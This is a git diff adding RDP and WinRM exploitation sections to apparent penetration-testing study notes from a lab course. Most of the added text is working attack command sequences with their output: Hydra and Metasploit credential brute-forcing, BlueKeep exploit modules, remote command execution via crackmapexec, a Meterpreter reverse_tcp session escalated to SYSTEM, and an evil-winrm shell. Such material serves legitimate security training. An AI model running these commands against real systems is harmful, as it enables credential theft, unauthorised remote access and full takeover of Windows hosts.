@@ -9,7 +9,9 @@
   - Exploiting WebDAV With Metasploit
   - Exploiting SMB With PsExec    
   - Exploiting Windows MS17-010 SMB Vulnerability (EternalBlue)    
-
+  - Exploiting RDP
+  - Exploiting WinRM    
+  
 - [Windows Privilege Escalation](#Windows Privilege Escalation)
 - [Windows File System Vulnerabilities](#Windows File System Vulnerabilities)
 - [Windows Credential Dumping](#Windows Credential Dumping)
@@ -399,7 +401,7 @@ meterpreter >
 
 ---
 
-### SMB
+#### 2- SMB
 
 - SMB (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and peripherals (printers and serial ports) between computers on a local network (LAN).
 - SMB uses port 445 (TCP). However, originally, SMB ran on top of NetBIOS using port 139.
@@ -680,6 +682,417 @@ msf5 > exploit/windows/smb/ms17_010_eternalblue
 ```
 
 <br />
+
+---
+
+#### 3- Exploiting RDP
+
+- The Remote Desktop Protocol (RDP) is a proprietary GUI remote access protocol developed by Microsoft and is used to remotely connect and interact with a Windows system.
+- RDP uses TCP port 3389 by default, and can also be configured to run on any other TCP port.
+- RDP authentication requires a legitimate user account on the target system as well as the user’s password in clear-text.
+- We can perform an RDP brute-force attack to identify legitimate user credentials that we can use to gain remote access to the target system.
+
+<br />
+
+**detect & confirm that RDP is running on specific port using metasploit `auxiliary/scanner/rdp/rdp_scanner` **
+
+```bash
+msf5 > use auxiliary/scanner/rdp/rdp_scanner
+msf5 auxiliary(scanner/rdp/rdp_scanner) > options
+
+Module options (auxiliary/scanner/rdp/rdp_scanner):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   DETECT_NLA       true             yes       Detect Network Level Authentication (NLA)
+   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect
+   RDP_CLIENT_NAME  rdesktop         no        The client computer name to report during connect, UNSET = random
+   RDP_DOMAIN                        no        The client domain name to report during connect
+   RDP_USER                          no        The username to report during connect, UNSET = random
+   RHOSTS                            yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT            3389             yes       The target port (TCP)
+   THREADS          1                yes       The number of concurrent threads (max one per host)
+
+msf5 auxiliary(scanner/rdp/rdp_scanner) > set RHOSTS 10.4.28.81
+RHOSTS => 10.4.28.81
+msf5 auxiliary(scanner/rdp/rdp_scanner) > set RPORT 3333
+RPORT => 3333
+msf5 auxiliary(scanner/rdp/rdp_scanner) > run
+
+[*] 10.4.28.81:3333       - Detected RDP on 10.4.28.81:3333       (Windows version: 6.3.9600) (Requires NLA: Yes)
+[*] 10.4.28.81:3333       - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf5 auxiliary(scanner/rdp/rdp_scanner) > 
+
+```
+
+We have successfully detected the RDP service port. Also, We can notice that the target RDP service port is not exposed to the default port (3389), instead it is exposed on port 3333
+
+<br />
+
+**bruteforce RDP credentials on port 3333 after detecting that RDP is running on it**
+
+```bash
+root@attackdefense:~# hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.4.28.81 -s 3333
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-15 19:48:45
+[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
+[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
+[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 7063 login tries (l:7/p:1009), ~1766 tries per task
+[DATA] attacking rdp://10.4.28.81:3333/
+[3333][rdp] host: 10.4.28.81   login: sysadmin   password: samantha
+[ERROR] freerdp: The connection failed to establish.
+[3333][rdp] host: 10.4.28.81   login: demo   password: victoria
+[ERROR] freerdp: The connection failed to establish.
+[3333][rdp] host: 10.4.28.81   login: auditor   password: elizabeth
+[ERROR] freerdp: The connection failed to establish.
+[3333][rdp] host: 10.4.28.81   login: administrator   password: qwertyuiop
+[ERROR] freerdp: The connection failed to establish.
+[STATUS] 6181.00 tries/min, 6181 tries in 00:01h, 882 to do in 00:01h, 4 active
+1 of 1 target successfully completed, 4 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-15 19:50:03
+
+```
+
+<br />
+
+**connect to the target via RDP**
+
+```bash
+root@attackdefense:~# xfreerdp /u:administrator /p:qwertyuiop /v:10.4.28.81:3333 
+```
+
+<br />
+
+
+
+**CVE-2019-0708 - BlueKeep RDP**
+
+- BlueKeep (CVE-2019-0708) is the name given to an RDP vulnerability in Windows that could potentially allow attackers to remotely execute arbitrary
+  code and gain access to a Windows system and consequently the network that the target system is a part of.
+- The BlueKeep vulnerability was made public by Microsoft in May 2019.
+- The BlueKeep exploit takes advantage of a vulnerability in the Windows RDP protocol that allows attackers to gain access to a chunk of kernel memory consequently allowing them to remotely execute arbitrary code at the system level without authentication with high privillage because it will run in kernel mode.
+- Microsoft released a patch for this vulnerability on May 14th, 2019 and has urged companies to patch this vulnerability as soon as possible.
+- At the time of discovery, about 1 million systems worldwide were found to be vulnerable.
+- The BlueKeep vulnerability affects multiple versions of Windows:
+  ○ XP
+  ○ Vista
+  ○ Windows 7
+  ○ Windows Server 2008 & R2
+
+<br />
+
+**CVE-2019-0708 - BlueKeep Exploit**
+
+- The BlueKeep vulnerability has various illegitimate PoC’s and exploit code that could be malicious in nature. It is therefore recommended to only utilize verified exploit code and modules for exploitation.
+- The BlueKeep exploit has an MSF auxiliary module that can be used to check if a target system if vulnerable to the exploit and also has an exploit module that can be used to exploit the vulnerability on unpatched systems.
+- The BlueKeep exploit module can be used to exploit vulnerable Windows systems and consequently provide us with a privileged meterpreter session on the target system.
+  **Note:** Targeting Kernel space memory and applications can cause system crashes
+
+<br />
+
+**detect the bluekeep rdp vulerability**
+
+```bash
+msf > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+```
+
+<br />
+
+**exploit the bluekeep rdp vulerability**
+
+```bash
+msf5 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+```
+
+<br />
+
+***
+
+#### Exploiting WinRM    
+
+- Windows Remote Management (WinRM) is a Windows remote management protocol that can be used to facilitate remote access with Windows systems over HTTP(S).
+- Microsoft implemented WinRM in to Windows in order to make life easier for system administrators but it's not configured as enabled by default .
+- WinRM is typically used in the following ways:
+  ○ Remotely access and interact with Windows hosts on a local network.
+  ○ Remotely access and execute commands on Windows systems.
+  ○ Manage and configure Windows systems remotely.
+- WinRM typically uses TCP port 5985 and 5986 (HTTPS).
+- WinRM implements access control and security for communication between systems through various forms of authentication.
+- We can utilize a utility called “crackmapexec” to perform a brute-force on WinRM in order to identify users and their passwords as well as execute
+  commands on the target system.
+- We can also utilize a ruby script called “evil-winrm” to obtain a command shell session on the target system.
+
+
+
+<br />
+
+```bash
+root@attackdefense:~# nmap 10.4.19.50 -p-
+Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-15 21:39 IST
+Nmap scan report for 10.4.19.50
+Host is up (0.0100s latency).
+Not shown: 65521 closed ports
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+5985/tcp  open  wsman
+47001/tcp open  winrm
+
+
+root@attackdefense:~# nmap 10.4.19.50 -sV -p5985,47001
+Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-15 21:41 IST
+Nmap scan report for 10.4.19.50
+Host is up (0.0100s latency).
+
+PORT      STATE SERVICE VERSION
+5985/tcp  open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+47001/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+
+```
+
+ winrm server is running on port 5985. By default WinRM service uses port 5985 for HTTP
+
+
+
+<br />
+
+**bruteforce winRM credentials using metasploit `scanner/winrm/winrm_login`**
+
+```bash
+msf > use scanner/winrm/winrm_login
+msf5 auxiliary(scanner/winrm/winrm_login) > set RHOSTS 10.4.19.50
+RHOSTS => 10.4.19.50
+msf5 auxiliary(scanner/winrm/winrm_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+USER_FILE => /usr/share/metasploit-framework/data/wordlists/common_users.txt
+msf5 auxiliary(scanner/winrm/winrm_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+PASS_FILE => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+msf5 auxiliary(scanner/winrm/winrm_login) > set VERBOSE false
+VERBOSE => false
+msf5 auxiliary(scanner/winrm/winrm_login) > run
+
+[+] 10.4.19.50:5985 - Login Successful: WORKSTATION\administrator:tinkerbell
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf5 auxiliary(scanner/winrm/winrm_login) > 
+
+```
+
+<br />
+
+**Checking WinRM supported authentication method using an auxiliary module `auxiliary/scanner/winrm/winrm_auth_methods`**
+
+This is very important to know, before we try to connect to the WinRM service. We need to use a valid authentication method while connecting to the service. You can find more information about the authentication from the below link:
+https://docs.microsoft.com/en-us/windows/win32/winrm/authentication-for-remote-connections
+
+```bash
+msf5 > use auxiliary/scanner/winrm/winrm_auth_methods
+msf5 auxiliary(scanner/winrm/winrm_auth_methods) > 
+msf5 auxiliary(scanner/winrm/winrm_auth_methods) > 
+msf5 auxiliary(scanner/winrm/winrm_auth_methods) > options
+
+Module options (auxiliary/scanner/winrm/winrm_auth_methods):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   DOMAIN   WORKSTATION      yes       The domain to use for Windows authentification
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT    5985             yes       The target port (TCP)
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   THREADS  1                yes       The number of concurrent threads (max one per host)
+   URI      /wsman           yes       The URI of the WinRM service
+   VHOST                     no        HTTP server virtual host
+
+msf5 auxiliary(scanner/winrm/winrm_auth_methods) > set RHOSTS 10.4.19.50
+RHOSTS => 10.4.19.50
+msf5 auxiliary(scanner/winrm/winrm_auth_methods) > run
+
+[+] 10.4.19.50:5985: Negotiate protocol supported
+[+] 10.4.19.50:5985: Basic protocol supported
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+Target supports two authentication types i.e Basic and Negotiate.
+
+
+
+<br />
+
+**Execute command on the target server using winrm_cmd module. `auxiliary/scanner/winrm/winrm_cmd`**
+
+```bash
+msf5 > use auxiliary/scanner/winrm/winrm_cmd
+msf5 auxiliary(scanner/winrm/winrm_cmd) > options
+
+Module options (auxiliary/scanner/winrm/winrm_cmd):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   CMD       ipconfig /all    yes       The windows command to run
+   DOMAIN    WORKSTATION      yes       The domain to use for Windows authentification
+   PASSWORD                   yes       The password to authenticate with
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT     5985             yes       The target port (TCP)
+   SSL       false            no        Negotiate SSL/TLS for outgoing connections
+   THREADS   1                yes       The number of concurrent threads (max one per host)
+   URI       /wsman           yes       The URI of the WinRM service
+   USERNAME                   yes       The username to authenticate as
+   VHOST                      no        HTTP server virtual host
+
+msf5 auxiliary(scanner/winrm/winrm_cmd) > set RHOSTS 10.4.19.50
+RHOSTS => 10.4.19.50
+msf5 auxiliary(scanner/winrm/winrm_cmd) > set USERNAME administrator
+USERNAME => administrator
+msf5 auxiliary(scanner/winrm/winrm_cmd) > set PASSWORD tinkerbell
+PASSWORD => tinkerbell
+msf5 auxiliary(scanner/winrm/winrm_cmd) > set CMD whoami
+CMD => whoami
+msf5 auxiliary(scanner/winrm/winrm_cmd) > run
+
+[+] 10.4.19.50:5985      : server\administrator
+
+[+] Results saved to /root/.msf4/loot/20240115215534_default_10.4.19.50_winrm.cmd_result_317273.txt
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+```
+
+<br />
+
+**get the meterpreter shell using metasploit `exploit/windows/winrm/winrm_script_exec`**
+
+```bash
+msf5 auxiliary(scanner/winrm/winrm_cmd) > use exploit/windows/winrm/winrm_script_exec
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf5 exploit(windows/winrm/winrm_script_exec) > options
+
+Module options (exploit/windows/winrm/winrm_script_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   DOMAIN     WORKSTATION      yes       The domain to use for Windows authentification
+   FORCE_VBS  false            yes       Force the module to use the VBS CmdStager
+   PASSWORD                    yes       A specific password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      5985             yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   URI        /wsman           yes       The URI of the WinRM service
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   USERNAME                    yes       A specific username to authenticate as
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.23.3       yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows
+
+
+msf5 exploit(windows/winrm/winrm_script_exec) > set RHOSTS 10.4.19.50
+RHOSTS => 10.4.19.50
+msf5 exploit(windows/winrm/winrm_script_exec) > set USERNAME administrator
+USERNAME => administrator
+msf5 exploit(windows/winrm/winrm_script_exec) > set PASSWORD tinkerbell
+PASSWORD => tinkerbell
+msf5 exploit(windows/winrm/winrm_script_exec) > set FORCE_VBS true
+FORCE_VBS => true
+msf5 exploit(windows/winrm/winrm_script_exec) > run
+
+[*] Started reverse TCP handler on 10.10.23.3:4444 
+[*] User selected the FORCE_VBS option
+[*] Sending stage (176195 bytes) to 10.4.19.50
+[*] Meterpreter session 1 opened (10.10.23.3:4444 -> 10.4.19.50:49897) at 2024-01-15 22:01:46 +0530
+[*] Session ID 1 (10.10.23.3:4444 -> 10.4.19.50:49897) processing InitialAutoRunScript 'post/windows/manage/priv_migrate'
+[*] Current session process is knbph.exe (4800) as: SERVER\Administrator
+[*] Session is Admin but not System.
+[*] Will attempt to migrate to specified System level process.
+[-] Could not migrate to services.exe.
+[-] Could not migrate to wininit.exe.
+[*] Trying svchost.exe (892)
+[+] Successfully migrated to svchost.exe (892) as: NT AUTHORITY\SYSTEM
+[*] nil
+[*] Command Stager progress - 100.00% done (101936/101936 bytes)
+
+meterpreter > pwd
+C:\Windows\system32
+```
+
+<br />
+
+**bruteforce winRM credentials using crackmapexec**
+
+```bash
+root@attackdefense:~# crackmapexec winrm 10.4.19.50 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+[*] First time use detected
+[*] Creating home directory structure
+[*] Creating default workspace
+[*] Initializing SMB protocol database
+[*] Initializing MSSQL protocol database
+[*] Initializing WINRM protocol database
+[*] Initializing SSH protocol database
+[*] Copying default configuration file
+[*] Generating SSL certificate
+WINRM       10.4.19.50      5985   NONE             [*] http://10.4.19.50:5985/wsman
+WINRM       10.4.19.50      5985   NONE             [-] None\administrator:admin "Failed to authenticate the user administrator with ntlm"
+
+WINRM       10.4.19.50      5985   NONE             [+] None\administrator:tinkerbell (Pwn3d!)
+
+```
+
+<br />
+
+**execute commands with winRM credentials using crackmapexec**
+
+```bash
+root@attackdefense:~# crackmapexec winrm 10.4.19.50 -u administrator -p tinkerbell -x whoami
+WINRM       10.4.19.50      5985   NONE             [*] http://10.4.19.50:5985/wsman
+WINRM       10.4.19.50      5985   NONE             [+] None\administrator:tinkerbell (Pwn3d!)
+WINRM       10.4.19.50      5985   NONE             [+] Executed command
+WINRM       10.4.19.50      5985   NONE             server\administrator
+
+```
+
+<br />
+
+**get cmd shell with `evil-winrm.rb` with winRM credentials**
+
+```bash
+root@attackdefense:~# evil-winrm.rb -u administrator -p tinkerbell -i 10.4.19.50 
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+server\administrator
+
+```
+
+
+
+
+
+
 
 
 
